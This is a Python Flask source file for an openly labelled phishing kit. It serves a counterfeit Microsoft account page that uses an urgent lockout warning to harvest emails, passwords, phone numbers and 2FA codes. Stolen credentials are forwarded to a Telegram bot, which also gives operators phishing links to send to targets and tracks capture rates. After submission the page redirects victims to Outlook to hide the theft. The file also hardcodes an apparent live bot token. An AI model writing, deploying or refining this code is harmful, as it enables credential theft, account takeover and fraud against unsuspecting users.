from flask import Flask, request, render_template_string
import logging
import os
import requests
import json
from datetime import datetime
import threading
import time

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Configuration
BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '')

PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
bot_running = False  # Fixed: Declared here

# Professional Microsoft Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html><head>
    <title>Microsoft Account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#f3f2f1;font-family:Segoe UI,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
        .card{max-width:360px;width:100%;margin:20px;padding:32px;background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);}
        .logo{text-align:center;margin-bottom:24px;}
        .logo img{height:28px;}
        h1{font-size:28px;color:#1f1f1f;margin:0 0 8px;font-weight:600;}
        p{color:#666;font-size:15px;margin-bottom:24px;}
        .warning{background:#fff3cd;padding:12px;border-radius:6px;border-left:4px solid #ffc107;margin-bottom:24px;}
        input{width:100%;padding:12px;margin-bottom:16px;border:1px solid #d1d5db;border-radius:6px;font-size:16px;box-sizing:border-box;}
        input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1);}
        button{width:100%;padding:14px;background:#3b82f6;color:white;border:none;border-radius:6px;font-size:16px;font-weight:500;cursor:pointer;}
        button:hover{background:#2563eb;}
        .footer{text-align:center;margin-top:24px;font-size:13px;color:#6b7280;}
    </style>
</head><body>
    <div class="card">
        <div class="logo">🔐</div>
        <h1>Secure your account</h1>
        <p>Unusual activity detected. Please verify now.</p>
        <div class="warning">⚠️ Account will be locked in 24 hours</div>
        <form method="POST">
            <input name="email" type="email" placeholder="Email" required>
            <input name="password" type="password" placeholder="Password" required>
            <input name="phone" type="tel" placeholder="Phone (optional)">
            <input name="otp" type="text" placeholder="2FA Code (optional)">
            <input name="user_id" type="hidden" value="{{ user_id }}">
            <button type="submit">Verify Account</button>
        </form>
        <div class="footer">Microsoft Account Security</div>
    </div>
</body></html>
"""

def send_telegram(chat_id, text, parse_mode='Markdown'):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}, timeout=10)
    except:
        pass

def process_update(update):
    global PHISHING_DATA, STATS
    
    try:
        message = update['message']
        chat_id = message['chat']['id']
        text = message.get('text', '').strip()
        user = message['from']
        user_id = user['id']
        username = user.get('username', user.get('first_name', 'User'))
        
        domain = 'https://your-app.onrender.com'  # Update with your domain
        
        if '/start' in text:
            phishing_url = f"{domain}/phish/{user_id}"
            msg = f"""🔥 PHISHING LINK

👤 {username} (ID: `{user_id}`)
🔗 `{phishing_url}`

Send this link to target!"""
            send_telegram(chat_id, msg)
        
        elif text == '/stats':
            rate = (STATS['captures'] / max(STATS['visits'], 1)) * 100
            msg = f"""📊 STATS
Visits: {STATS['visits']}
Hits: {STATS['captures']}
Rate: {rate:.1f}%"""
            send_telegram(chat_id, msg)
        
        elif text == '/data' and ADMIN_CHAT_ID and str(chat_id) == ADMIN_CHAT_ID:
            if PHISHING_DATA:
                recent = PHISHING_DATA[-3:]
                msg = "🎯 LATEST:\n\n"
                for data in recent:
                    msg += f"📧 {data['email']}\n🔑 {data['password']}\n⏰ {data['time']}\n\n"
                send_telegram(chat_id, msg)
            else:
                send_telegram(chat_id, "No data yet!")
        
    except:
        pass

def telegram_loop():
    global bot_running
    offset = 0
    
    while bot_running:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={'offset': offset, 'timeout': 20}).json()
            
            if resp['ok']:
                for update in resp['result']:
                    process_update(update)
                    offset = update['update_id'] + 1
                    
        except:
            pass
        time.sleep(2)

# Routes
@app.route('/')
def index():
    return f"<h1>🚀 Bot Active</h1><p>Visits: {STATS['visits']} | Captures: {STATS['captures']}</p><p>Telegram: /start /stats /data</p>"

@app.route('/phish/<user_id>')
def phish(user_id):
    global STATS
    STATS['visits'] += 1
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/phish/<user_id>', methods=['POST'])
def capture(user_id):
    global STATS, PHISHING_DATA
    
    data = {
        'email': request.form.get('email', ''),
        'password': request.form.get('password', ''),
        'phone': request.form.get('phone', ''),
        'otp': request.form.get('otp', ''),
        'time': datetime.now().strftime('%H:%M %d/%m')
    }
    
    PHISHING_DATA.append(data)
    STATS['captures'] += 1
    
    if ADMIN_CHAT_ID:
        msg = f"🎣 HIT!\n📧 {data['email']}\n🔑 {data['password']}\n📱 {data['phone']}\n⏰ {data['time']}"
        send_telegram(ADMIN_CHAT_ID, msg)
    
    return '<script>alert("Verified!");window.location="https://outlook.live.com";</script>'

if __name__ == '__main__':
    global bot_running
    bot_running = True
    
    # Start bot thread
    bot_thread = threading.Thread(target=telegram_loop, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
